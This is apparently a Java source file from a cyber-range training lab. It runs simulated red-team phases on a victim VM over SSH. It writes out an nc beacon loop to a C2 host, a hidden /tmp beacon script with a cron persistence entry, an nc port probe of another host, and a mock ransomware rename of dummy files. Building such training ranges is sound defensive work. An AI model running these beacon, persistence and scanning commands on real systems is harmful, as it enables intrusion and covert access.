package com.minisoc.lab.executor;

import com.minisoc.lab.model.AttackPhase;
import com.minisoc.lab.model.CommandResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Service;

import java.util.Map;

/**
 * Orchestrates Red Team attacks by executing commands on the victim VM via SSH.
 *
 * Each attack phase maps to specific system-level actions:
 *   INITIAL_ACCESS   → spawn beacon loop / reverse shell
 *   PERSISTENCE      → install cron job
 *   LATERAL_MOVEMENT → probe/spread to additional hosts
 *   EXFILTRATION     → simulate data theft / ransomware
 *
 * Attack commands run on the victim (not Kali) for simplicity in MVP.
 * The backend acts as the orchestrator that decides WHEN to attack.
 */
@Service
public class AttackExecutor {

    private static final Logger log = LoggerFactory.getLogger(AttackExecutor.class);

    private final SystemCommandExecutor commandExecutor;

    @Value("${cyber-range.victim.ip:}")
    private String victimIp;

    @Value("${cyber-range.kali.ip:}")
    private String kaliIp;

    @Value("${cyber-range.c2.ip:10.0.0.30}")
    private String c2Ip;

    @Value("${cyber-range.c2.port:4444}")
    private int c2Port;

    public AttackExecutor(SystemCommandExecutor commandExecutor) {
        this.commandExecutor = commandExecutor;
    }

    /**
     * Execute the attack for the given phase.
     * Returns result details including what was launched.
     */
    public Map<String, Object> executePhaseAttack(AttackPhase phase) {
        if (victimIp == null || victimIp.isBlank()) {
            log.warn("No victim IP configured — attack skipped (cyber-range.victim.ip)");
            return Map.of("success", false, "reason", "No victim IP configured");
        }

        return switch (phase) {
            case INITIAL_ACCESS -> executeInitialAccess();
            case PERSISTENCE -> executePersistence();
            case LATERAL_MOVEMENT -> executeLateralMovement();
            case EXFILTRATION -> executeExfiltration();
            case CONTAINED -> Map.of("success", false, "reason", "Attack contained — no action");
        };
    }

    /**
     * Phase 1: Spawn a persistent beacon loop.
     * This creates a process that:
     *  - Runs in a loop
     *  - Attempts to beacon to C2
     *  - Respawns if individual iteration is killed (loop persists)
     *  - Is detectable by process monitoring
     */
    private Map<String, Object> executeInitialAccess() {
        // Beacon loop: attempts nc connection every 5s
        // Uses bash -c so entire cmdline is visible to ps/monitoring
        String command = String.format(
                "bash -c 'while true; do echo beacon | nc -w 2 %s %d 2>/dev/null; sleep 5; done'",
                c2Ip, c2Port
        );

        CommandResult result = commandExecutor.executeAsync(victimIp, command);
        log.info("ATTACK [INITIAL_ACCESS]: beacon loop → {}", result.success() ? "launched" : "failed");

        return Map.of(
                "success", result.success(),
                "phase", "INITIAL_ACCESS",
                "action", "beacon_loop",
                "target", victimIp,
                "c2", c2Ip + ":" + c2Port,
                "details", result.success() ? "Beacon loop spawned" : result.stderr()
        );
    }

    /**
     * Phase 2: Install persistence via cron job.
     * Creates a beacon script in /tmp and schedules it via crontab.
     */
    private Map<String, Object> executePersistence() {
        // Drop beacon script
        String dropScript = String.format(
                "echo '#!/bin/bash\necho beacon | nc -w 2 %s %d 2>/dev/null' > /tmp/.beacon.sh && chmod +x /tmp/.beacon.sh",
                c2Ip, c2Port
        );
        commandExecutor.execute(victimIp, dropScript);

        // Add cron job (every 5 minutes)
        String cronCommand = "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/.beacon.sh') | crontab -";
        CommandResult result = commandExecutor.execute(victimIp, cronCommand);

        log.info("ATTACK [PERSISTENCE]: cron job → {}", result.success() ? "installed" : "failed");

        return Map.of(
                "success", result.success(),
                "phase", "PERSISTENCE",
                "action", "cron_persistence",
                "target", victimIp,
                "details", result.success() ? "Cron job installed + beacon script dropped" : result.stderr()
        );
    }

    /**
     * Phase 3: Simulate lateral movement.
     * Probe other hosts/ports from the victim.
     */
    private Map<String, Object> executeLateralMovement() {
        // Scan local subnet for other hosts (quick nmap-like probe)
        String command = "for port in 22 80 445; do " +
                "(echo scan | nc -w 1 192.168.56.102 $port 2>/dev/null && echo \"OPEN:192.168.56.102:$port\") & " +
                "done; wait";

        CommandResult result = commandExecutor.execute(victimIp, command);
        log.info("ATTACK [LATERAL_MOVEMENT]: subnet probe → {}", result.success() ? "complete" : "failed");

        return Map.of(
                "success", result.success(),
                "phase", "LATERAL_MOVEMENT",
                "action", "subnet_probe",
                "target", victimIp,
                "details", result.success() ? "Lateral probe completed: " + result.stdout() : result.stderr()
        );
    }

    /**
     * Phase 4: Simulate data exfiltration / ransomware.
     * Create dummy sensitive files and encrypt (rename) them.
     */
    private Map<String, Object> executeExfiltration() {
        String command = "mkdir -p /tmp/exfil_data && " +
                "for i in $(seq 1 5); do echo 'CONFIDENTIAL DATA '$i > /tmp/exfil_data/doc_$i.txt; done && " +
                "for f in /tmp/exfil_data/*.txt; do mv \"$f\" \"$f.encrypted\"; done";

        CommandResult result = commandExecutor.execute(victimIp, command);
        log.info("ATTACK [EXFILTRATION]: ransomware sim → {}", result.success() ? "executed" : "failed");

        return Map.of(
                "success", result.success(),
                "phase", "EXFILTRATION",
                "action", "ransomware_simulation",
                "target", victimIp,
                "details", result.success() ? "Files encrypted in /tmp/exfil_data/" : result.stderr()
        );
    }

    /**
     * Clean up all attack artifacts from the victim.
     * Used when resetting the game.
     */
    public CommandResult cleanup() {
        if (victimIp == null || victimIp.isBlank()) {
            return CommandResult.error("", "cleanup", "No victim IP configured");
        }

        String command = "pkill -f 'while true.*beacon' 2>/dev/null; " +
                "pkill -f '.beacon.sh' 2>/dev/null; " +
                "crontab -r 2>/dev/null; " +
                "rm -f /tmp/.beacon.sh 2>/dev/null; " +
                "rm -rf /tmp/exfil_data 2>/dev/null; " +
                "echo 'cleanup complete'";

        return commandExecutor.execute(victimIp, command);
    }

    public String getVictimIp() {
        return victimIp;
    }

    public String getC2Ip() {
        return c2Ip;
    }
}
